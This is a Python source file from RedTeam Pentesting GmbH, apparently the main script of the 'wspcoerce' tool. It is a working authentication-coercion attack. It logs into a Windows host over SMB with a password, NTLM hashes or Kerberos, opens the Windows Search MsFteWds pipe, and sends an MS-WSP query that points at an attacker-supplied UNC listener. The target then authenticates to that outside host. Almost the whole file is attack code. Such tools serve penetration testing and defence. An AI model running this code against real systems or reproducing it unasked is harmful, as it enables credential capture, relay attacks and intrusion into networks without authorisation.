########################################
#                                      #
#  RedTeam Pentesting GmbH             #
#  kontakt@redteam-pentesting.de       #
#  https://www.redteam-pentesting.de/  #
#                                      #
########################################

import sys
import logging
import argparse

from impacket.examples import logger
from impacket import version
from impacket.smbconnection import SMBConnection
from impacket.smbconnection import SessionError as SMBConnectionSessionError
from impacket.examples.utils import parse_target
from impacket.smb3 import *

from wspcoerce.packets import *
from wspcoerce.constants import *


def main():
    logger.init()
    print(version.BANNER)

    parser = argparse.ArgumentParser(
        add_help=True, description="Authentication coercion using MS-WSP"
    )

    parser.add_argument(
        "target",
        action="store",
        help="[[domain/]username[:password]@]<targetName or address>",
    )
    parser.add_argument(
        "listener", action="store", help="e.g. file:////hawk/SomeFolder"
    )
    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")
    parser.add_argument(
        "-local-name",
        action="store",
        default="NotUsed",
        help="Is specified in CPMConnectIn but not needed",
    )

    group = parser.add_argument_group("authentication")

    group.add_argument(
        "-hashes",
        action="store",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes, format is LMHASH:NTHASH",
    )
    group.add_argument(
        "-no-pass", action="store_true", help="don't ask for password (useful for -k)"
    )
    group.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file "
        "(KRB5CCNAME) based on target parameters. If valid credentials "
        "cannot be found, it will use the ones specified in the command "
        "line",
    )
    group.add_argument(
        "-aesKey",
        action="store",
        metavar="hex key",
        help="AES key to use for Kerberos Authentication " "(128 or 256 bits)",
    )

    group = parser.add_argument_group("connection")

    group.add_argument(
        "-dc-ip",
        action="store",
        metavar="ip address",
        help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in "
        "the target parameter",
    )
    group.add_argument(
        "-target-ip",
        action="store",
        metavar="ip address",
        help="IP Address of the target machine. If omitted it will use whatever was specified as target. "
        "This is useful when target is the NetBIOS name and you cannot resolve it",
    )
    group.add_argument(
        "-port",
        choices=["139", "445"],
        nargs="?",
        default="445",
        metavar="destination port",
        help="Destination port to connect to SMB Server",
    )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ""

    if (
        password == ""
        and username != ""
        and options.hashes is None
        and options.no_pass is False
        and options.aesKey is None
    ):
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(":")
    else:
        lmhash = ""
        nthash = ""

    smbClient = SMBConnection(
        address, options.target_ip, sess_port=int(options.port)
    )  # , preferredDialect=SMB_DIALECT)
    if options.k is True:
        smbClient.kerberosLogin(
            username, password, domain, lmhash, nthash, options.aesKey, options.dc_ip
        )
    else:
        smbClient.login(username, password, domain, lmhash, nthash)

    # Let's disable SMB3 Encryption for now
    # smbClient._SMBConnection._Session["SessionFlags"] &= ~SMB2_SESSION_FLAG_ENCRYPT_DATA

    treeId = smbClient.connectTree("IPC$")
    logging.info("Connected to IPC$")


    try:
        fileId = smbClient.createFile(treeId, "MsFteWds", FILE_READ_DATA, FILE_SHARE_READ)
    except SMBConnectionSessionError as e:
        if e.getErrorString()[0] == "STATUS_OBJECT_NAME_NOT_FOUND":
            logging.error("MsFteWds pipe is not available. Maybe the Windows Search service is not running (Default on Windows Server >=2016)?")
        else:
            logging.error(f"Unknwon SessionError: {e.getErrorString()}")
        exit(1)
    logging.info("Connected to MsFteWds pipe")

    wsp_connect = smbClient._SMBConnection.ioctl(
        treeId,
        fileId,
        FSCTL_PIPE_TRANSCEIVE,
        SMB2_0_IOCTL_IS_FSCTL,
        CPMConnectIn(options.local_name, username).to_bytes(),
        0,
        40,
    )
    logging.info("Sent WSP Connect")

    wsp_query = smbClient._SMBConnection.ioctl(
        treeId,
        fileId,
        FSCTL_PIPE_TRANSCEIVE,
        SMB2_0_IOCTL_IS_FSCTL,
        CPMCreateQueryIn(options.listener).to_bytes(),
        0,
        40,
    )
    logging.info("Sent WSP Query")

    wsp_disconnect = smbClient._SMBConnection.ioctl(
        treeId,
        fileId,
        FSCTL_PIPE_TRANSCEIVE,
        SMB2_0_IOCTL_IS_FSCTL,
        CPMDisconnect().to_bytes(),
        0,
        40,
    )
    logging.info("Sent WSP Disconnect")

    smbClient.closeFile(treeId, fileId)
    smbClient.disconnectTree(treeId)
    smbClient.logoff()


if __name__ == "__main__":
    main()
